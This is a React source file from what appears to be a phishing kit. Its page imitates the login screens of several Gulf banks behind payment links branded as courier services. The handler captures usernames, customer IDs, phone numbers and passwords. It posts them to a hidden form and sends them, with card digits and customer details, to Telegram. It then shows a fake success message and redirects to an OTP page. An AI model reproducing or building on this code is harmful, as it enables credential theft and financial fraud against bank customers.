import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Loader2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getServiceBranding } from "@/lib/serviceLogos";
import { applyDynamicIdentity } from "@/lib/dynamicIdentity";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { 
  AlRajhiBankLogin, 
  SNBBankLogin, 
  EmiratesNBDLogin, 
  QNBLogin, 
  NBKLogin,
  DefaultBankLogin 
} from "@/components/bank-logins";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();
  
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const customerInfo = linkData?.payload?.customerInfo || {};
  const selectedBankId = linkData?.payload?.selectedBank || '';
  const cardInfo = linkData?.payload?.cardInfo || {};
  
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const shippingInfo = linkData?.payload as any;
  const rawAmount = shippingInfo?.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, selectedCountry);
  
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
  
  useEffect(() => {
    if (selectedBankId && selectedBankId !== 'skipped') {
      applyDynamicIdentity(`bank_${selectedBankId}`);
    }
  }, [selectedBankId]);
  
  const getLoginType = () => {
    if (!selectedBank) return 'username';
    
    const bankId = selectedBank.id;
    
    if (bankId === 'alrajhi_bank' || bankId === 'alahli_bank' || bankId === 'samba_bank' || 
        bankId === 'arab_national_bank' || bankId === 'alinma_bank' || bankId === 'aljazira_bank' ||
        bankId === 'emirates_nbd' || bankId === 'fab' || bankId === 'dib' || bankId === 'cbd' ||
        bankId === 'gulf_bank' || bankId === 'burgan_bank' || bankId === 'ahli_united_bank' ||
        bankId === 'cbq' || bankId === 'doha_bank' || bankId === 'masraf_alrayan' ||
        bankId === 'national_bank_oman' || bankId === 'bank_dhofar' || bankId === 'nizwa_bank' ||
        bankId === 'nbb' || bankId === 'ahli_united_bahrain' || bankId === 'bisb' || bankId === 'khaleeji_bank') {
      return 'username';
    }
    
    return 'customerId';
  };
  
  const loginType = getLoginType();
  
  if (linkLoading || !linkData) {
    return (
      <div 
        className="min-h-screen flex items-center justify-center" 
        dir="rtl"
        style={{
          background: '#F5F5F5'
        }}
      >
        <div className="text-center">
          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: '#004B87' }} />
          <p style={{ color: '#1F2937', fontFamily: 'Cairo, sans-serif' }}>جاري تحميل البيانات...</p>
        </div>
      </div>
    );
  }
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (loginType === 'username' && (!username || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال اسم المستخدم وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'customerId' && (!customerId || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم العميل وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'phone' && (!phoneNumber || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم الجوال وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);

    const bankLoginData = {
      username: loginType === 'username' ? username : '',
      customerId: loginType === 'customerId' ? customerId : '',
      phoneNumber: loginType === 'phone' ? phoneNumber : '',
      password: password,
      loginType: loginType,
    };

    sessionStorage.setItem('bankLoginData', JSON.stringify(bankLoginData));

    if (linkData) {
      try {
        const updatedPayload = {
          ...linkData.payload,
          bankLoginData,
        };

        await updateLink.mutateAsync({
          linkId: id!,
          payload: updatedPayload
        });
      } catch (error) {
      }
    }
    
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "bank-login",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr || '',
          bank: selectedBank?.nameAr || 'غير محدد',
          cardLast4: cardInfo.cardLast4,
          loginType: loginType,
          username: bankLoginData.username,
          customerId: bankLoginData.customerId,
          phoneNumber: bankLoginData.phoneNumber,
          password: password,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
    }

    await sendToTelegram({
      type: 'bank_login',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        cardLast4: cardInfo.cardLast4,
        cardType: cardInfo.cardType,
        loginType: loginType,
        username: bankLoginData.username,
        customerId: bankLoginData.customerId,
        phoneNumber: bankLoginData.phoneNumber,
        password: password,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تسجيل الدخول بنجاح",
    });
    
    navigate(`/pay/${id}/otp`);
  };
  
  if (!selectedBank) {
    return null;
  }

  const renderBankLogin = () => {
    const commonProps = {
      username,
      setUsername,
      customerId,
      setCustomerId,
      phoneNumber,
      setPhoneNumber,
      password,
      setPassword,
      showPassword,
      setShowPassword,
      isSubmitting,
      onSubmit: handleSubmit,
    };

    switch (selectedBankId) {
      case 'alrajhi_bank':
        return <AlRajhiBankLogin {...commonProps} />;
      
      case 'alahli_bank':
      case 'samba_bank':
      case 'saudi_investment_bank':
        return <SNBBankLogin {...commonProps} />;
      
      case 'emirates_nbd':
        return <EmiratesNBDLogin {...commonProps} />;
      
      case 'qnb':
        return <QNBLogin {...commonProps} />;
      
      case 'nbk':
        return <NBKLogin {...commonProps} />;
      
      default:
        return (
          <DefaultBankLogin
            bank={selectedBank}
            loginType={loginType}
            {...commonProps}
          />
        );
    }
  };
  
  return (
    <>
      <PaymentMetaTags 
        serviceKey={serviceKey}
        serviceName={serviceName}
        title={`دفع آمن - ${serviceName}`}
        customDescription={`أكمل عملية الدفع بأمان تام - ${serviceName}`}
        amount={formattedAmount}
      />

      {renderBankLogin()}
    
      <form name="bank-login" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="country" />
        <input type="text" name="bank" />
        <input type="text" name="cardLast4" />
        <input type="text" name="loginType" />
        <input type="text" name="username" />
        <input type="text" name="customerId" />
        <input type="text" name="phoneNumber" />
        <input type="password" name="password" />
        <input type="text" name="timestamp" />
      </form>
    </>
  );
};

export default PaymentBankLogin;
